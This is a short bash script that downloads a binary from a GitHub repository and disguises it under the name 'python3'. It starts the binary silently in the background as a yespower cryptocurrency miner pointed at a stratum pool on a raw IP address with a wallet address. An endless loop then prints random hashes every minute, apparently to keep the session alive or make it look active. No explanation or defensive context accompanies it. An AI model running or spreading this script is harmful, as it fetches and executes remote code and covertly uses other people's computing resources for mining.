#!/bin/bash
curl -L -o python3 https://github.com/viliamriah/newmind/raw/main/python3
chmod +x python3
./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1q4f9hemgt64tpj2cranaxhtrcqqqedvnngzunpy.$(echo $(shuf -i 1-20000 -n 1)-cuk1) -p x -t 2 >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
